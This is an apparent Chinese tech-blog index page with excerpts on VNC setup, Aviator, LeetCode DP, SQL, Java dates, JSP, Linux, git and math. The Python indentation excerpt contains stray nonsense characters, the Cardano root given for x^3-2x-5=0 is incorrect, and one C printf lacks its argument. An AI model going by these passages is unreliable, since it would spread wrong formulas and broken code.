1. 安装tigervnc，查看安装版本 yum install tigervnc-server -y rpm -qa | grep tigervnc-server 2. 修改配置文件，添加用户VNC开机自启动 cp /lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service vim /etc/systemd/system/vncserver@\:1.service [Unit] Description=Remote desktop service (VNC) After=syslog.target network.target [Service] Type=simple # Clean any existing files in /tmp/.X11-unix environment ExecStartPre=/bin/sh -c '/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :' ExecStart=/sbin/runuser -l root -c "/usr/bin/vncserver %i" PIDFile=/root/.vnc/%H%i.pid ExecStop=/bin/sh -c '/usr/bin/vncserver -kill %i &gt; /dev/null 2&gt;&amp;1 || :' [Install] WantedBy=multi-user.target 如果为普通用户可将root修改为普通用户即可
vncpasswd	##设置vnc登录密码，输入两次密码后输入no; 启动vnc
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ae33d02b6f31627312eed4f75ea2e1b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9234ada46496fd374625c6f14d4619d6/" rel="bookmark">
			表达式引擎Aviator基本介绍及使用以及基于Aviator的规则引擎（附代码详细介绍）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Aviator 1.1 什么是Aviator? Aviator是一门高性能、轻量级的Java语言实现的表达式求值引擎，主要用于表达式的动态求值。
1.2 为什么需要Aviator? Aviator的设计目标是 轻量级 和 高性能 ，相对于Groovy、JRuby的笨重，Aviator非常小，加上依赖包就450K，不算依赖包就70K，不过Aviator的语法受限，它并不是一门完整的语言，只是语言的一小部分集合。
1.3 Aviator的特点 Aviator的实现思路与其它轻量级的求值器不同，其它求值器是通过解释的方式运行，而Aviator是直接将表达式编译成Java字节码，交给JVM去执行。
Aviator的定位是介于Groovy这样重量级脚本语言和IKExpression这样轻量级表达式引擎之间。
1.4 Aviator的功能 • 支持大部分运算操作符，包括算数运算符、关系运算符、逻辑操作符、正则匹配操作符、三元表达式，并且还致辞操作符的优先级以及括号的强制优先级。
• 支持函数调用和自定义函数
• 支持正则表达式匹配
• 自动类型转换，当执行操作的时候，会自动判断操作数类型并做相应的转换，无法转换就抛异常
• 支持传入变量，支持类似a.b.c的嵌套变量访问。
• 性能优秀
1.5 使用场景 • 规则判断以及规则引擎
• 公式计算
• 动态脚本控制
等等…
1.6 怎么使用Aviator? AviatorScript使用文档：AviatorScript语法文档
创建空的Maven项目，导入如下的依赖
&lt;dependency&gt; &lt;groupId&gt;com.googlecode.aviator&lt;/groupId&gt; &lt;artifactId&gt;aviator&lt;/artifactId&gt; &lt;version&gt;5.1.4&lt;/version&gt; &lt;/dependency&gt; 一个简单的例子:
//Aviator的使用都是集中通过com.googlecode.aviator.AviatorEvaluator这个入口类来处理 public void test1() { Long sum = (Long)AviatorEvaluator.execute("1 + 2 + 3"); System.out.println(sum); } //结果为： 6 注意点： Aviator的数值类型只支持Long和Double，任何整数都将会转换成Long，任何浮点数都会转换成Double，包括用户传入的变量数值。
其它例子：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9234ada46496fd374625c6f14d4619d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ecb79b780f0eaec7bc6a588c9dc7eed4/" rel="bookmark">
			Leetcode题目【回文子串&#43;回文子序列】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 647. 回文子串5. 最长回文子串516. 最长回文子序列 647. 回文子串 作为一个回文子串，主打的就是连续子串、两边对称。所以递推公式怎么想呢？子问题dp是一个成型的回文子串，当我左右两边加上相同的字符，才会再次构成当前的回文子串！ 【dp数组的定义】：
题目是求回文子串的个数。如果直观上用dp的子状态来存储子问题的回文串个数，当i、j位置上元素相等时，那此时确实是子问题的dp值加1，但是没法判断子问题它是不是回文串呀。所以这里的dp设计的是，当前子串是不是回文串，而不是当前子串包含的回文串的数量 。至于最后要求的数量，直接弄个变量进行累加就行了，dp数组都存好了是不是回文串，就不愁数量的计算了。
class Solution: def countSubstrings(self, s: str) -&gt; int: size = len(s) dp = [[0]*size for i in range(size)] #开始时假设任意子串都不是回文的 res = 0 for i in range(size-1, -1, -1): #i从大到小遍历 for j in range(i, size): #j小于i的就不用考虑了，j从小到大遍历 if s[i]==s[j]: #两边相等 if j-i&lt;=1 or dp[i+1][j-1]==1: #长度是1或2，或子问题是回文串 dp[i][j] = 1 res += 1 return res 5. 最长回文子串 和上题本质一样，就是加个变量记录一下最大长度，记录下最大长度的左右边界
class Solution: def longestPalindrome(self, s: str) -&gt; str: size = len(s) dp = [[0]*size for i in range(size)] #开始时假设任意子串都不是回文的 maxLen = 1 l,r = 0,0 for i in range(size-1, -1, -1): #i从大到小遍历 for j in range(i, size): #j小于i的就不用考虑了，j从小到大遍历 if s[i]==s[j]: #两边相等 if j-i&lt;=1 or dp[i+1][j-1]==1: #只有1个或2个字符，或者子问题是回文的 dp[i][j] = 1 if j-i+1&gt;maxLen: #更新最优值 maxLen = j-i+1 l,r = i,j return s[l:r+1] 516.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ecb79b780f0eaec7bc6a588c9dc7eed4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0c08ef71fd983f8411acc8ddda935d27/" rel="bookmark">
			日期清洗的sql函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		sql语言是postgressql。
函数只处理了
中国格式 ： xxxx年-xx月-xx日
美国格式： mm/dd/yyyy， September 04,1991， September 1991， sept 04， 1991
uunix格式： yyyy/mm/dd， yyyy/mm， 1991-01-1， 1991-1 ， 1991-01
其他格式可以自行添加
预期的日期格式是： 1991/1/1 。 不能有0，即1991/01/01 是失败的
函数返回的是： " ‘预期格式’，年，月"
一、主要使用的内置函数是： 1. instr( &lt;start_position&gt; ,'str1' , 'str2' , &lt;times&gt;) 。 查找str2在str1出现的位置。num是出现的次数，默认是1。例如num=2，就是str2在str1第二次出现的位置。start_position是起始的位置下标，默认是从头开始即 1。
若str2在str1找不到，则返回0
instr('123456', '2') -- 结果是: 2. 位置索引值是从1开始 instr('123456', '2' , 2) -- 结果是0 ， 因为2 只出现一次 2. substr(str1, start_position, &lt;length&gt; ) 截取字符串， 从str1 的 start_position开始截取， 截取长度是 length。length不填就是截取到字符串的最右边。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0c08ef71fd983f8411acc8ddda935d27/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c476214ee5c4447cbbac31c9ce76e7e6/" rel="bookmark">
			总结java 字符串，日期类Date和 Calendar相互转化，以及相关常用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Java中，可以通过以下方法将字符串转换为Date：
String dateString = "2023-07-28"; DateFormat format = new SimpleDateFormat("yyyy-MM-dd"); Date date = format.parse(dateString); 在这个例子中，我们将一个字符串类型的日期转换为Date对象。需要注意的是，我们需要使用SimpleDateFormat类来指定日期格式。
同样地，我们也可以将Date转换为字符串：
Date date = new Date(); DateFormat format = new SimpleDateFormat("yyyy-MM-dd"); String dateString = format.format(date); Java中，可以通过以下方法将Date转换为Calendar：
Date date = new Date(); Calendar calendar = Calendar.getInstance(); calendar.setTime(date); 在这个例子中，我们将当前时间的Date对象转换为Calendar对象。需要注意的是，我们需要使用Calendar.getInstance()方法来获取一个Calendar实例。
同样地，我们也可以将Calendar转换为Date：
Calendar calendar = Calendar.getInstance(); Date date = calendar.getTime(); 在这个例子中，我们将当前时间的Calendar对象转换为Date对象。需要注意的是，我们需要使用Calendar.getTime()方法来获取一个Date实例。
除了转换之外，Date和Calendar类还有许多常用的方法。以下是一些常见的方法：
Date类方法
getTime()：返回自1970年1月1日00:00:00 GMT以来的毫秒数。
toString()：返回一个表示此日期的字符串。
before(Date when)：如果此日期在when之前，则返回true。
after(Date when)：如果此日期在when之后，则返回true。
Calendar类方法
get(int field)：返回给定日历字段的值。
set(int field, int value)：将给定日历字段设置为给定值。
add(int field, int amount)：将给定的时间量添加到给定的日历字段中。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c476214ee5c4447cbbac31c9ce76e7e6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/71c528ef2bfb14978c05a02d2baebb6f/" rel="bookmark">
			通过自定义指令来实现点击空白处关闭select弹窗的功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 在全局main.js中注册自定义指令 import { createApp } from 'vue' const app = createApp({}) app.directive('click-outside', { mounted(el, binding) { const onClickOutside = (event) =&gt; { if (!el.contains(event.target) &amp;&amp; el !== event.target) { binding.value() } } document.addEventListener('click', onClickOutside) el._clickOutside = onClickOutside }, beforeUnmount(el) { document.removeEventListener('click', el._clickOutside) delete el._clickOutside } }) &lt;/script&gt; // 在组件中使用自定义指令 &lt;template&gt; &lt;div&gt; &lt;el-select v-click-outside="closeSelect"&gt; &lt;!-- select options --&gt; &lt;/el-select&gt; &lt;/div&gt; &lt;/template&gt; &lt;script setup&gt; const closeSelect=()=&gt; { // 关闭select弹窗的逻辑 } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/51c38d004fed8063784f30cfc273a698/" rel="bookmark">
			JSP入门指南：了解JSP的基本概念与应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、什么是JSP以及为什么要引入JSP JSP（JavaServer Pages）是一种用于开发动态Web应用程序的技术，它允许在HTML页面中嵌入Java代码，从而实现在服务器端动态生成内容。JSP是一种模板技术，它将Java代码嵌入到HTML页面中，使得开发人员可以更方便地创建动态的Web页面。
引入JSP的主要目的是为了简化Web应用程序的开发过程，并实现动态内容的展示。使用JSP可以将Java代码和HTML代码组合在一起，而不需要手动拼接字符串，使得代码更加易读、易维护。
二、如何访问JSP页面 通过URL访问JSP页面：使用浏览器，在地址栏中输入JSP页面的URL。URL的格式通常是：http://localhost:8080/工程名/your-jsp-file.jsp。其中，localhost是服务器地址，8080是服务器端口号，your-app-name是Web应用程序的名称，your-jsp-file.jsp是你要访问的JSP文件名。
三、JSP的本质是什么（附有源码解释说明） JSP页面在客户端浏览器请求时，由服务器端的JSP引擎解析和处理。在处理JSP页面时，JSP引擎会将JSP文件转换成Java Servlet，并将其编译成Java字节码，然后加载并执行这些Java字节码。因此，JSP页面实际上是Servlet的一种简化表示形式。总结来说，JSP的本质是一种简化了的Servlet表示形式，它允许开发者在HTML页面中插入Java代码，从而在服务器端动态生成内容，并将其返回给客户端浏览器进行显示。
以下是一个简单的JSP页面示例，假设这个JSP页面的文件名是:hello.jsp
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello JSP&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, &lt;%= request.getParameter("name") %&gt;!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; 在这个例子中，&lt;%= request.getParameter("name") %&gt;是一个JSP表达式，它会在服务器端被求值，并将结果插入到生成的HTML内容中。当浏览器请求hello.jsp页面时，服务器端的JSP引擎会将这个JSP页面转换成类似下面的Servlet代码：
import javax.servlet.*; import javax.servlet.http.*; import javax.servlet.jsp.*; import java.io.*; public final class hello_jsp extends org.apache.jasper.runtime.HttpJspBase implements org.apache.jasper.runtime.JspSourceDependent { // JSP File Dependencies private static final java.lang.Class&lt;?&gt;[] dependencies = {}; // other imports and variables... public void _jspService(final HttpServletRequest request, final HttpServletResponse response) throws java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/51c38d004fed8063784f30cfc273a698/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9547a70a97068e2d819ff5405890fe17/" rel="bookmark">
			C语言之数据结构算法的时间复杂度与空间复杂度（考研笔记）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先我们要知道，算法的时间复杂度是在算法运行之前，预估算法时间开销T(n)与问题规模n的关系（T表示time），分析一个算法的时间复杂度的时候，最重要的就是同n来表示出时间开销T。接下来我们用一个小例子来进行理解：
在《复仇者联盟4》中的一个片段，父亲对女儿说“我爱你1000遍”，女儿回答说“我爱你3000遍”那么我们来设计一个算法来实现“表白爱你n遍”
#include &lt;stdio.h&gt; void loveyou(int n){//n为问题规模 int i=1; while(i&lt;=n) { i++;//每次+1 printf("I love you %d\n",i); } printf("I love you more than %d\n"); } int main() { loveyou(3000); return 0; } 我们来分析一下，其中的代码分别运行来几次
在上面的例子中，时间复杂度的公式还是相对简单的，但是对于不同的情况，公式越发复杂时，我们无法通过公式对其复杂度进行判断，接下来我们来思考：
问题1:是否可以忽略表达式中的某些部分？
问题2:如果有好几千行代码，按这种方法需要一行一行数？
通过以上问题的思考，我们得到以下结论：
在问题1中：
当n足够大时，我们可以只考虑阶数高的部分，用O(f(n))表示，O的含义是T(n)的数量级，f(n)表示执行次数，其余部分忽略，公式如下：
接下来我们看乘法中的举例，该例子中，相加两项哪一个阶数更大呢？
需要用到以下公式：
通过以下的函数表达式还能够更直观的看出其对应关系，我们可以用“常对幂指阶”这样的口诀进行记忆
在问题2中：
1.顺序执行的代码只会影响常数项，可以忽略。
2.只需要挑循环中的一个基本操作分析它的执行次数与n的关系即可
3.当有嵌套循环时，比如内层循环执行n的2次方次，外层循环执行n次，我们只需要保留最高阶的部分即可，即只需要关注最深层循环循环了几次
接下来我们来做一下相关练习：
练习1：
#include &lt;stdio.h&gt; void loveyou(int n){//n为问题规模 int i=1; while(i&lt;=n) { i=i*2；//每次翻倍 printf("I love you %d\n",i); } printf("I love you more than %d\n"); } int main() { loveyou(3000); return 0; } 练习2：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9547a70a97068e2d819ff5405890fe17/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7a1add6e133f58213f79b09bc6b416d6/" rel="bookmark">
			linux对分区进行扩容
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第一步 把剩余的空间先创建一个分区，具体步骤参考上一篇文章使用fdisk命令对磁盘进行分区
加入这里新添加的分区名叫做 /dev/sda4
第二步 创建物理卷
pvcreate /dev/sda4 如果提示找不到 /dev/sda4。请输入 partprobe 这个再创建分区的时候应该会有提示。
第三步 使用 vgscan 查看卷组
vgscan 这里叫做 centos
第四步 使用新增的物理卷扩展 centos
vgextend centos /dev/sda4 第五步 扩展lv，这里假设上面新建的分区大小是180G，这里跟的是要扩展分区名
lvextend -L +180G /dev/mapper/centos-root 这里可能会提示空间不足，可能是因为计算误差把，适当减小即可
第六步 让文件系统识别新添加的磁盘文件系统
xfs_growfs /dev/mapper/centos-root 这里使用命令df -h 可发现/dev/mapper/centos-root 下面的空间扩大了 180G
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/67c25813d1035240fc190879bef3f9d8/" rel="bookmark">
			Linux 常用命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.查看进程 ps -ef|grep java：ps -ef 表示列出所有进程的详细信息，包括进程号、用户、CPU 占用率等等，而 grep 则用于过滤 ps -ef 命令的输出结果，只显示包含指定关键字的进程信息。
ps -ef | grep python 可以列出所有正在运行的 Python 进程信息。
top：实时显示系统中运行的进程，按 CPU 使用率排序。
2.查看端口 netstat -tuln
netstat -tuln |grep 5432
lsof -i:5432
3.查看内存占用 free -h
4.查看磁盘 df -h：显示所有挂载的文件系统的使用情况，包括文件系统的挂载点、总容量、已用空间、可用空间和使用百分比。
du -h：查看文件或目录的磁盘使用情况
du -sh：总的使用情况
5.Linux硬链接与软链接 硬链接是在同一文件系统中创建的，而软链接可以跨越不同的文件系统。硬链接与原文件共享inode（即硬链接和原文件在磁盘上占用的空间相同），而软链接则是一个新的文件，它指向原文件。硬链接只能对文件进行创建，而软链接既可以对文件，也可以对目录进行创建。 创建硬链接：ln &lt;目标文件&gt; &lt;链接文件&gt;
创建软链接：ln -s &lt;目标文件或目录&gt; &lt;链接文件名&gt;
6.创建并查看文件 touch filename：创建一个文件，再通过vi进行编辑
cat filename：将文件的内容打印到终端上
less filename：以分页的方式查看文件的内容。允许你在文件中上下滚动，并支持搜索和其他交互操作
more filename：以分页的方式查看文件的内容。逐页地查看文件的内容
head -n filename：显示文件的前几行，默认情况下显示前 10 行
tail -n 3 filename：显示文件的末尾几行，默认情况下显示末尾的 10 行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/67c25813d1035240fc190879bef3f9d8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b833c40152d53f6da49139863852e0b1/" rel="bookmark">
			Deeplearning.AI自然语言处理学习笔记——C2W3——自动完成（填充）——练习题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		20230728:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa8004cbb238a61dbeea626ab07d7a2e/" rel="bookmark">
			事实表与维度表
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 事实表（Fact Table）是指存储有事实记录的表，如系统日志、销售记录等；事实表的记录在不断地动态增长，所以它的体积通常远大于其他表。 维度表（Dimension Table）或维表，有时也称查找表（Lookup Table），是与事实表相对应的一种表；它保存了维度的属性值，可以跟事实表做关联；相当于将事实表上经常重复出现的属性抽取、规范出来用一张表进行管理。常见的维度表有：日期表（存储与日期对应的周、月、季度等的属性）、地点表（包含国家、省／州、城市等属性）等。 使用维度表有诸多好处，具体如下：
缩小了事实表的大小。 便于维度的管理和维护，增加、删除和修改维度的属性，不必对事实表的大量记录进行改动。 维度表可以为多个事实表重用，以减少重复工作。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e479e27e7ccc7b000ed659c7e3a4098e/" rel="bookmark">
			HarmonyOS云开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		云侧服务部署到Serverless后需要人工进行运维，如购买服务器，配置防火墙等操作False
应用的运行离不开云侧支撑True
Serverless服务可以根据业务流量进行弹性扩缩容True
DevEco中云开发能力和原有端开发能力深度融合 True
鸿蒙应用可以使用Arkts开发 True
-----------
以下关于端云一体化的说法正确的是 C. 端云一体化工程目录结构中不仅包含了端侧代码，也包含了云侧代码
如何快速部署完整的云侧代码？ C. 选择整个云工程右键选择部署
以下选项关于端云一体组件说法错误的是 C. 开发者需要自己写云侧逻辑
==错题==
以下说法不正确的是： A. 端云一体化开发可以同时开发端侧和云侧代码
端云一体云侧开发推荐开发者使用哪种开发语言 B. java
----
Serverless服务有哪些特点 ABC
登录并关联云开发资源需要以下哪些步骤 ABC
端云一体化开发当前提供了哪些云侧能力ABCD
==错题==
获取云开发模板的方式 ABCD ABC
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1665bfd469a420fec51ecee41740d4c/" rel="bookmark">
			Linux 启动Java-jar脚本 以及开机自启
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		start.sh 启动命令：./start.sh start/stop/restart xxxx.jar
#!/bin/sh
startLogDir="temp"
if [ ! -d "$startLogDir" ];then
mkdir $startLogDir
fi
###
SERVICE_NAME="$2"
#ENVFILE="env"
PIDFILE=temp/"$2"_"pid"
checkRunning(){
if [ -f "$PIDFILE" ]; then
if [ -z "`cat $PIDFILE`" ];then
echo "ERROR: Pidfile '$PIDFILE' exists but contains no pid"
return 2
fi
PID="`cat ${PIDFILE}`"
RET="`ps -p "${PID}"|grep java`"
if [ -n "$RET" ];then
return 0;
else
return 1;
fi
else
return 1;
fi
}
status(){
if ( checkRunning );then
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a1665bfd469a420fec51ecee41740d4c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/87603750280d20c288116ae1917888b4/" rel="bookmark">
			python语言中缩进代表什么,python缩进有什么作用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大家好，本文将围绕python语言中缩进代表什么展开说明，python缩进有什么作用是一个很多人都想弄明白的事情，想搞清楚python中缩进的意义需要先了解以下几个事情。
1、python一般怎样缩进 在python中，强制要求缩进，一般使用Tab或困隐空格来进行缩进，且缩进必须要保持一致，否则可能会出缩进的错误。官方规定是缩进四个空格，而Tab键不一定等于四个空格，所以需要设置一个tab等于四个空格。
要求严格的代码缩进是Python语法的一大特色，好比C语言中的花括号一样重要，在大多数场合还非常有必要。在很多代码规范里面也都有要求代码书写按照一定规则进行换行和代码缩进，但是汪族厅这些要求只是纯粹是方便人来阅读、使用或修改的，对于编译器或者解释器而言，完全是视而不见的存在。
但是对Python解释器而言，每行代码前的缩进都是语法和逻辑上的意义;Python这个特性，也穗配经常在Python使用者和非Python使用者中引起争论。
与其他语言不同，Python属于强制缩进的，它这种做法属于双刃剑，有好处也有坏处。
好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的管理，应该始终坚持使用四个空格的缩进。
另一个好处是强迫你写出缩进较少的代码，你会倾向于将一段很长的代码拆分成若干函数，从而得到缩进较少的代码。
坏处就是复制、粘贴功能失效了，这是非常不友好的地方。当你重构代码时，粘贴过去的代码必须重新检查缩进是否正确;此外，IDE很难像格式化Java代码那样格式化python代码。
务必注意：python程序是区分大小写的，如果写错了大小写，程序会报错。
python使用缩进来组织代码块，请务必遵守约定俗成的习惯，坚持使用4个空格的缩进。在文本编辑器中，需要设置把Tab自动转换为4个空格，确保不混用tab和空格。
2、python语法缩进是什么意思 在python中，强制要求缩进，一般使用Tab或困隐空格来进行缩进，且缩进必须要保持一致，否则可能会出缩进的错误。官方规定是缩进四个空格，而Tab键不一定等于四个空格，所以需要设置一个tab等于四个空格。
要求严格的代码缩进是Python语法的一大特色，好比C语言中的花括号一样重要，在大多数场合还非常有必要。在很多代码规范里面也都有要求代码书写按照一定规则进行换行和代码缩进，但是汪族厅这些要求只是纯粹是方便人来阅读、使用或修改的，对于编译器或者解释器而言，完全是视而不见的存在。
但是对Python解释器而言，每行代码前的缩进都是语法和逻辑上的意义;Python这个特性，也穗配经常在Python使用者和非Python使用者中引起争论。
与其他语言不同，Python属于强制缩进的，它这种做法属于双刃剑，有好处也有坏处。
好处是强迫你写出格式化的代码，但没有规定缩进是几个空格还是Tab。按照约定俗成的管理，应该始终坚持使用四个空格的缩进。
另一个好处是强迫你写出缩进较少的代码，你会倾向于将一段很长的代码拆分成若干函数，从而得到缩进较少的代码。
坏处就是复制、粘贴功能失效了，这是非常不友好的地方。当你重构代码时，粘贴过去的代码必须重新检查缩进是否正确;此外，IDE很难像格式化Java代码那样格式化python代码。
务必注意：python程序是区分大小写的，如果写错了大小写，程序会报错。
python使用缩进来组织代码块，请务必遵守约定俗成的习惯，坚持使用4个空格的缩进。在文本编辑器中，需要设置把Tab自动转换为4个空格，确保不混用tab和空格。
顾名思义，缩进就是向里面收缩的意思，比如汉语书写习惯文章每段前面都要空两个字，这就叫首行缩进。段落缩进自然就是指整个段向内收缩了。
那么python语法缩进是什么意思呢？
学习 Python 与其他语言最大的区别就是，Python 的代码块不使用 {} 来控制类，函数以及其他逻辑判断。python 最具特色的就是用缩进来写模块。
缩进的空白数量是可变的，但是所有代码块语句必须包含相同的缩进空白数量，这个必须严格执行。如下所示：
if True: 晌埋穗print "True" else: print "False" 以下代码将会执行错误：
#!/usr/bin/python # -*- coding: UTF-8 -*- # 文件名： if True: print "Answer" print "True" else: print "Answer" # 没有严格缩进，在执行时会报错 print "False" 执行以上代码，会出现如下错误提醒：
$ python
File "", line 5
if True:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/87603750280d20c288116ae1917888b4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/057d2e6b94e872c0cbbc28226e8b31f5/" rel="bookmark">
			JS删除对象里面属性是空的键值对
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		let obj = { jjs: '', b: 0, c: undefined, d: null, e: { a: [{as:null}], b: {ki:null}, c: null }, s: [{a:'',s:[{i:null}]}], a: '223' } // 删除载荷中是空值的键值对 function filterObj(obj) { Object.keys(obj).forEach(item =&gt; { switch(typeof obj[item]) { case 'string': if (obj[item]==='') { delete obj[item] } break; case 'undefined': delete obj[item] break; case 'object': if (obj[item] === null) { delete obj[item] } else if(obj[item] instanceof Array) { obj[item].forEach(child =&gt; { filterObj(child) }) } else if (obj[item] instanceof Object) { filterObj(obj[item]) } break; } }) } filterObj(obj) console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/057d2e6b94e872c0cbbc28226e8b31f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac83b4fddb2ce1b0fa1fcae2ddcc61e0/" rel="bookmark">
			git本地库和远程库的相关操作命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、分支概念：
二、 本地库分支管理：
1. 查看分支情况：
命令1：git branch
2. 新建分支
命令1： git branch &lt;分支名&gt;
命令2： git branch &lt;新建分支名&gt; &lt;源分支名&gt;
命令3：git switch -c &lt;分支名&gt;
​编辑
命令4：git checkout -b &lt;分支名&gt;
3. 切换分支
命令1： git switch &lt;分支名&gt;
命令2： git checkout &lt;分支名&gt;
4. 删除分支
命令1： git branch -d &lt;分支名&gt;
5. 修改本地分支
三、远程库分支管理
1.查看分支情况：
命令1： git branch -r
命令2： git remote show &lt;远程库名&gt;
2.新建远程分支
方法1：在本地新建一个分支后，推送到远程库。所以需要关联远程库和本地库
3. 删除远程库分支
命令1： git push &lt;远程库名&gt; --delete &lt;分支名&gt;
四、 关联本地库和远程库
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ac83b4fddb2ce1b0fa1fcae2ddcc61e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f63fc3531856c564cffb9f7b8190a30b/" rel="bookmark">
			华为OD机试 - 输出指定字母在字符串的中的索引（Java)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目描述
给定一个字符串，把字符串按照大写在前小写在后排序，输出排好后的第 K 个字母在原来字符串的索引。
相同字母输出第一个出现的位置。
输入描述
无
输出描述
无
用例
输入hAkDAjByBq 4输出6说明排好序后 AABBDhjkqy，第 4 个是 B，第一个出现的在原字符串 6 这个位置。（注：索引是从 0 开始） import java.util.Arrays; import java.util.Scanner; public class Main { // 输入获取 public static void main(String[] args) { Scanner sc = new Scanner(System.in); String str = sc.next(); int idx = sc.nextInt(); System.out.println(getResult(str, idx)); } // 算法入口 public static int getResult(String str, int idx) { char[] sArr = str.toCharArray(); Arrays.sort(sArr); char target = sArr[idx - 1]; return str.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f63fc3531856c564cffb9f7b8190a30b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bdcca49523bf57e76e1e65cd7490322e/" rel="bookmark">
			数学学习——解析解与数值解、收敛与发散、一阶导数、二阶导数与三阶导数的几何意义
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 解析解和数值解收敛与发散一阶导数、二阶导数与三阶导数的几何意义 解析解和数值解 解析解，又称为闭式解，是可以用解析表达式来表达的解。解析表达式是由有限个常数、变量和基本函数（如分式、三角函数、指数、对数等）组成的有限长的表达式。解析解可以精确地表示问题的解，不需要任何近似或误差。
数值解，又称为近似解，是用数值方法来求得的解。数值方法是利用计算机或其他工具，通过迭代或递推等方式，逐步逼近问题的真实解的一种方法。数值解不能精确地表示问题的解，只能在一定的误差范围内给出一个近似值。
例如，求方程
x 3 − 2 x − 5 = 0 x^3−2x−5=0 x3−2x−5=0
的根，可以用以下两种方法：
解析方法： 利用卡尔丹公式（Cardano’s formula），可以得到方程的一个实根为
x = 1 2 ​ + 29 108 3 ​​​ + 1 2 ​ − 29 108 3 ​​​ x=\sqrt[3]{\frac{1}{2}​+\sqrt{\frac{29}{108}}}​​​+\sqrt[3]{\frac{1}{2}​-\sqrt{\frac{29}{108}}}​​​ x=321​​+10829​ ​ ​​​​+321​​−10829​ ​ ​​​​
，这就是方程的一个解析解。
数值方法： 利用牛顿法（Newton’s method），可以得到方程的一个近似根为
x = 2.0945514815 x=2.0945514815 x=2.0945514815
，这就是方程的一个数值解。
收敛与发散 发散是指某个数学对象（如数列、函数、级数等）在无限的过程中，没有趋向于一个确定的值，或者在某个范围内没有保持一致的性质。
收敛是指某个数学对象（如数列、函数、级数等）在无限的过程中，趋向于一个确定的值，或者在某个范围内保持一致的性质。
例1：
数列
